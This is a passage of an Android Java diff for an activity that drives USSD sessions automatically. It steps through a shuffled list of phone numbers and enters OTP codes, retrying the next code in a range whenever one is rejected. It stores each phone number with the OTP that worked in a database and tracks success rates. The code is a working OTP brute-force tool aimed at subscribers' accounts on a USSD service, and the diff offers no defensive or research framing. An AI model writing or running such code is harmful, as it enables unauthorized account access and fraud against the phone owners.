+                    Log.d(TAG, "  - Message is null: " + (message == null));
+                    Log.d(TAG, "  - Message length: " + (message != null ? message.length() : 0));
+                    Log.d(TAG, "  - ACTUAL MESSAGE: " + message);
+                if (message == null) {
+                    Log.e(TAG, "processUSSD.responseInvoke: NULL response received!");
+                    Toast.makeText(ProcessingActivity.this, "ERROR: No USSD response", Toast.LENGTH_SHORT).show();
+                    tvStatus.setText("ERROR: No USSD response");
+                    completeSessionAndMoveNext("NULL_RESPONSE");
+                    return;
+                }
+
+                tvStatus.setText("USSD Response: " + message.substring(0, Math.min(80, message.length())));
+                Log.d(TAG, "processUSSD.responseInvoke: Full message: " + message);
+                Toast.makeText(ProcessingActivity.this, "USSD Response received! Auto-sending 1...", Toast.LENGTH_SHORT).show();
+
+                // Send "1" directly as per VoIpUSSD library documentation
+                // NO try-catch, NO delays - just direct nested calls
+                Log.d(TAG, "processUSSD: SENDING '1' FOR MENU");
+                tvStatus.setText("Auto-sending: 1");
+
+                ussdApi.send("1", new USSDController.CallbackMessage() {
+                    @Override
+                    public void responseMessage(String msg) {
+                        Log.d(TAG, "processUSSD: After sending '1': " + (msg != null ? msg : "null"));
+                        tvStatus.setText("After 1: " + (msg != null ? msg.substring(0, Math.min(50, msg.length())) : "null"));
+
+                        // Send phone number - direct nested call as per documentation
+                        Log.d(TAG, "processUSSD: SENDING PHONE NUMBER: " + phoneNumber);
+                        tvStatus.setText("Auto-sending phone: " + phoneNumber);
+
+                        ussdApi.send(phoneNumber, new USSDController.CallbackMessage() {
+                            @Override
+                            public void responseMessage(String msg2) {
+                                Log.d(TAG, "processUSSD: After phone number: " + (msg2 != null ? msg2 : "null"));
+                                tvStatus.setText("After phone: " + (msg2 != null ? msg2.substring(0, Math.min(50, msg2.length())) : "null"));
+
+                                // Check if OTP needed using advanced pattern matching
+                                if (isOtpRequiredResponse(msg2)) {
+                                    Log.d(TAG, "processUSSD: OTP REQUIRED detected by pattern matcher");
+
+                                    if (finalOtpCode != null) {
+                                        // Send OTP - direct nested call
+                                        Log.d(TAG, "processUSSD: SENDING OTP: " + finalOtpCode);
+                                        tvStatus.setText("Auto-sending OTP: " + finalOtpCode);
+
+                                        ussdApi.send(finalOtpCode, new USSDController.CallbackMessage() {
+                                            @Override
+                                            public void responseMessage(String msg3) {
+                                                Log.d(TAG, "processUSSD: After OTP: " + (msg3 != null ? msg3 : "null"));
+
+                                                // Cancel timeout when we get OTP response
+                                                if (timeoutRunnable != null) {
+                                                    handler.removeCallbacks(timeoutRunnable);
+                                                    timeoutRunnable = null;
+                                                    Log.d(TAG, "processUSSD: Timeout cancelled after OTP response");
+                                                }
+                                                handleFinalResponse(msg3, phoneNumber, finalOtpCode, otpToSend);
+                                            }
+                                        });
+                                    } else {
+                                        Log.d(TAG, "processUSSD: No OTP provided, starting retry sequence");
+                                        isUSSDActive = false;
+                                        retryWithNextOTP(phoneNumber, otpStartFrom);
+                                    }
+                                } else {
+                                    Log.d(TAG, "processUSSD: No OTP needed or immediate success");
+                                    handleFinalResponse(msg2, phoneNumber, null, -1);
+                                }
+                            }
+                        });
+                    }
+                });
+            }
+
+            @Override
+            public void over(String message) {
+                Log.d(TAG, "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<");
+                Log.d(TAG, "CALLBACK: over TRIGGERED");
+                Log.d(TAG, "  - Message: " + (message != null ? message : "null"));
+                Log.d(TAG, "  - This means USSD session ended");
+                Log.d(TAG, "  - sessionCompleted: " + sessionCompleted);
+                tvStatus.setText("USSD ended: " + (message != null ? message : "null"));
+
+                // Use coordinated completion to avoid race conditions
+                completeSessionAndMoveNext("USSD_OVER_CALLBACK");
+                Log.d(TAG, "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<");
+            }
+        });
+            Log.d(TAG, "processUSSD: ussdApi.callUSSDInvoke() call COMPLETED (waiting for callbacks)");
+            Log.d(TAG, "****************************************");
+
+            // Add watchdog to detect if callback never fires
+            handler.postDelayed(() -> {
+                if (!callbackFired[0]) {
+                    Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+                    Log.e(TAG, "WATCHDOG: responseInvoke callback NEVER FIRED after 5 seconds!");
+                    Log.e(TAG, "This indicates the USSD library is not triggering callbacks properly");
+                    Log.e(TAG, "Possible causes:");
+                    Log.e(TAG, "  1. Accessibility service not reading USSD dialog");
+                    Log.e(TAG, "  2. HashMap mapping interfering with callbacks");
+                    Log.e(TAG, "  3. USSD dialog format not recognized by library");
+                    Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+                    Toast.makeText(ProcessingActivity.this, "⚠️ USSD callback not triggered! Check accessibility service", Toast.LENGTH_LONG).show();
+                    tvStatus.setText("ERROR: USSD callback not triggered - check accessibility service");
+                }
+            }, 5000);
+        } catch (Exception e) {
+            Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+            Log.e(TAG, "processUSSD: EXCEPTION caught!");
+            Log.e(TAG, "  Exception type: " + e.getClass().getName());
+            Log.e(TAG, "  Exception message: " + e.getMessage());
+            Log.e(TAG, "  Stack trace:");
+            e.printStackTrace();
+            Toast.makeText(this, "ERROR: Exception during USSD - " + e.getMessage(), Toast.LENGTH_LONG).show();
+            tvStatus.setText("ERROR: " + e.getMessage());
+            Log.e(TAG, "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+
+            // Use coordinated completion
+            completeSessionAndMoveNext("EXCEPTION: " + e.getMessage());
+        }
+    }
+
+    private void handleFinalResponse(String message, String phoneNumber, String otpCode, int otpAttempt) {
+        Log.d(TAG, "=====================================");
+        Log.d(TAG, "handleFinalResponse: CALLED");
+        Log.d(TAG, "  - phoneNumber: " + phoneNumber);
+        Log.d(TAG, "  - otpCode: " + (otpCode != null ? otpCode : "NULL"));
+        Log.d(TAG, "  - otpAttempt: " + otpAttempt);
+        Log.d(TAG, "  - message: " + (message != null ? message.substring(0, Math.min(50, message.length())) : "NULL"));
+        Log.d(TAG, "  - sessionCompleted: " + sessionCompleted);
+
+        // Check if session already completed (avoid duplicate processing)
+        if (sessionCompleted) {
+            Log.w(TAG, "handleFinalResponse: SKIPPED - Session already completed");
+            return;
+        }
+
+        if (message != null) {
+            // Use advanced pattern matching
+            if (isInvalidOtpResponse(message)) {
+                // Invalid OTP, try next OTP in the range
+                Log.d(TAG, "handleFinalResponse: ❌ INVALID OTP detected - will retry with next OTP");
+                tvStatus.setText("Invalid OTP " + otpCode + ", trying next...");
+                Toast.makeText(this, "Invalid OTP " + otpCode + ", retrying...", Toast.LENGTH_SHORT).show();
+
+                // Mark session as complete and release lock BEFORE retry
+                sessionCompleted = true;
+                isUSSDActive = false;
+
+                // Cancel timeout
+                if (timeoutRunnable != null) {
+                    handler.removeCallbacks(timeoutRunnable);
+                    timeoutRunnable = null;
+                }
+
+                // Retry with next OTP (this will restart the USSD flow)
+                retryWithNextOTP(phoneNumber, otpAttempt + 1);
+
+            } else if (isSuccessResponse(message)) {
+                // ✅ SUCCESS - Log to database
+                long phoneDuration = System.currentTimeMillis() - currentPhoneStartTime;
+                Log.d(TAG, "✅✅✅ SUCCESS DETECTED!");
+                Log.d(TAG, "  Phone: " + phoneNumber + " | OTP: " + (otpCode != null ? otpCode : "N/A") + " | Attempts: " + currentPhoneAttemptCount);
+                Log.d(TAG, "  Duration for this phone: " + (phoneDuration / 1000) + "s");
+
+                successCount++;
+                totalAttempts += currentPhoneAttemptCount;
+
+                // Save to database if OTP was used
+                if (otpCode != null) {
+                    DatabaseHelper dbHelper = new DatabaseHelper(this);
+                    boolean saved = dbHelper.saveOtpResult(phoneNumber, otpCode, currentPhoneAttemptCount);
+                    if (saved) {
+                        Log.d(TAG, "✅ OTP SAVED: " + phoneNumber + " -> " + otpCode + " (Attempts: " + currentPhoneAttemptCount + " | Success#" + successCount + " | Time: " + (phoneDuration / 1000) + "s)");
+                    }
+                }
+
+                String successMsg = String.format("✅ SUCCESS [%d/%d] %s | OTP: %s | %ds",
+                                                 successCount, shuffledNumbers.size(), phoneNumber,
+                                                 (otpCode != null ? otpCode : "N/A"), phoneDuration / 1000);
+                tvStatus.setText(successMsg);
+                Toast.makeText(this, successMsg, Toast.LENGTH_LONG).show();
+                completeSessionAndMoveNext("SUCCESS");
+
+            } else {
+                // Unknown/unclear response, move to next phone number
+                failureCount++;
+                Log.d(TAG, "handleFinalResponse: Unknown/unclear response, moving to next number");
+                Log.d(TAG, "  Failure count: " + failureCount);
+                tvStatus.setText("❌ Failed: " + phoneNumber + " (unclear response)");
+                Toast.makeText(this, "Unclear response for " + phoneNumber, Toast.LENGTH_SHORT).show();
+                completeSessionAndMoveNext("UNCLEAR_RESPONSE");
+            }
+        } else {
+            // No response at all, move to next
+            failureCount++;
+            Log.d(TAG, "handleFinalResponse: NULL response - moving to next");
+            Log.d(TAG, "  Failure count: " + failureCount);
+            tvStatus.setText("❌ Failed: " + phoneNumber + " (no response)");
+            Toast.makeText(this, "No response for " + phoneNumber, Toast.LENGTH_SHORT).show();
+            completeSessionAndMoveNext("NULL_FINAL_RESPONSE");
+        }
+        Log.d(TAG, "=====================================");
+    }
+
+
+
+    private void stopProcessing() {
+        Log.d(TAG, "========================================");
+        Log.d(TAG, "stopProcessing: CALLED");
+        Log.d(TAG, "========================================");
+
+        isProcessing = false;
+        isUSSDActive = false;
+        sessionCompleted = true; // Prevent any callbacks from continuing
+
+        // Cancel any pending timeout
+        if (timeoutRunnable != null) {
+            handler.removeCallbacks(timeoutRunnable);
+            timeoutRunnable = null;
+            Log.d(TAG, "stopProcessing: Cancelled pending timeout");
+        }
+
+        // Remove any pending handler callbacks
+        handler.removeCallbacksAndMessages(null);
+        Log.d(TAG, "stopProcessing: Cleared all pending handler tasks");
+
+        tvStatus.setText("Processing stopped by user");
+        Toast.makeText(this, "Processing stopped", Toast.LENGTH_SHORT).show();
+
+        btnStart.setEnabled(true);
+        btnStop.setEnabled(false);
+        btnClose.setEnabled(true);
+
+        Log.d(TAG, "stopProcessing: Complete");
+    }
+
+    private void finishProcessing() {
+        isProcessing = false;
+
+        // Calculate session statistics
+        long sessionDuration = System.currentTimeMillis() - sessionStartTime;
+        long durationSeconds = sessionDuration / 1000;
+        long minutes = durationSeconds / 60;
+        long seconds = durationSeconds % 60;
+
+        // Calculate success rate
+        int totalProcessed = successCount + failureCount;
+        double successRate = totalProcessed > 0 ? (successCount * 100.0 / totalProcessed) : 0;
+
+        String stats = String.format("✅ Success: %d | ❌ Failed: %d | ⏱️ Time: %dm %ds | 📊 Rate: %.1f%%",
+                                    successCount, failureCount, minutes, seconds, successRate);
+
+        tvStatus.setText(stats);
+        tvCurrentNumber.setText("Session completed");
+
+        Log.d(TAG, "========================================");
+        Log.d(TAG, "SESSION COMPLETE - STATISTICS:");
+        Log.d(TAG, "  Total phones processed: " + totalProcessed);
+        Log.d(TAG, "  Successful: " + successCount);
+        Log.d(TAG, "  Failed: " + failureCount);
+        Log.d(TAG, "  Total OTP attempts: " + totalAttempts);
+        Log.d(TAG, "  Session duration: " + minutes + "m " + seconds + "s");
+        Log.d(TAG, "  Success rate: " + String.format("%.2f%%", successRate));
+        Log.d(TAG, "  Average time per phone: " + (totalProcessed > 0 ? (durationSeconds / totalProcessed) + "s" : "N/A"));
+        Log.d(TAG, "========================================");
+
+        btnStart.setEnabled(true);
+        btnStop.setEnabled(false);
+        btnClose.setEnabled(true);
+
+        Toast.makeText(this, stats, Toast.LENGTH_LONG).show();
+    }
+
+    private void updateProgress() {
+        int total = shuffledNumbers.size();
+        int current = currentIndex + 1;
+        tvProgress.setText(current + " / " + total);
+        progressBar.setMax(total);
+        progressBar.setProgress(current);
+    }
+
+    private void updateUI() {
+        if (shuffledNumbers != null && !shuffledNumbers.isEmpty()) {
+            tvProgress.setText("0 / " + shuffledNumbers.size());
+            progressBar.setMax(shuffledNumbers.size());
+            progressBar.setProgress(0);
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                checkPermissionsAndStart();
+            } else {
+                Toast.makeText(this, "Phone permission is required", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+
+    @Override
+    public boolean onSupportNavigateUp() {
+        finish();
+        return true;
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "onDestroy: Cleaning up handlers and callbacks");
+
+        // Stop processing
+        isProcessing = false;
+        isUSSDActive = false;
+        sessionCompleted = true;
+
+        // Cancel all pending handlers
+        if (handler != null) {
+            handler.removeCallbacksAndMessages(null);
+        }
+
+        // Cancel timeout if active
+        if (timeoutRunnable != null) {
+            handler.removeCallbacks(timeoutRunnable);
+            timeoutRunnable = null;
+        }
+
+        Log.d(TAG, "onDestroy: Cleanup complete");
+    }
+}
